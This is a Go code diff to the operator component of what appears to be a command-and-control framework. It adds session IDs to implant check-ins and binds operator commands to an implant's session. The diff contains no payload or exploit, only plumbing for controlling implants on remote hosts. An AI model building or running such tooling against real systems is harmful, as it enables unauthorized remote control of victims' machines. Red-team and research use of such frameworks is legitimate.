@@ -24,6 +24,7 @@ type ClientInfo struct {
 	User        string
 	ConnectedAt string
 	PID         int
+	SessionID   string
 }
 
 // Operator sends commands and retrieves results.
@@ -62,6 +63,13 @@ func (op *Operator) SendCommand(module string, args map[string]interface{}) (int
 
 	msg := protocol.NewC2Message(module, seq)
 	msg.Args = args
+
+	// Bind command to attached client's session
+	if op.attachedClient != "" {
+		if info, ok := op.connectedClients[op.attachedClient]; ok {
+			msg.SessionID = info.SessionID
+		}
+	}
 
 	encoded, err := protocol.EncodeMessage(msg.ToCommandMap(), op.key)
 	if err != nil {
@@ -623,11 +631,11 @@ func (op *Operator) handleCheckin(result map[string]interface{}) {
 	hostname, _ := info["hostname"].(string)
 	osInfo, _ := info["os"].(string)
 	user, _ := info["user"].(string)
+	sessionID, _ := info["session_id"].(string)
 	pid := 0
 	if p, ok := info["pid"].(float64); ok {
 		pid = int(p)
 	}
-	// Use current time (when operator received it), not implant send time
 	timestamp := time.Now().Format("2006-01-02 15:04:05")
 
 	op.connectedClients[clientID] = ClientInfo{
@@ -636,15 +644,17 @@ func (op *Operator) handleCheckin(result map[string]interface{}) {
 		User:        user,
 		ConnectedAt: timestamp,
 		PID:         pid,
+		SessionID:   sessionID,
 	}
 
 	fmt.Printf("\n[+] New implant connected!\n"+
 		"    client_id : %s\n"+
+		"    session   : %s\n"+
 		"    hostname  : %s\n"+
 		"    os        : %s\n"+
 		"    user      : %s\n"+
 		"    timestamp : %s\n\n%s",
-		clientID, hostname, osInfo, user, timestamp,
+		clientID, sessionID[:12], hostname, osInfo, user, timestamp,
 		op.prompt())
 }
 
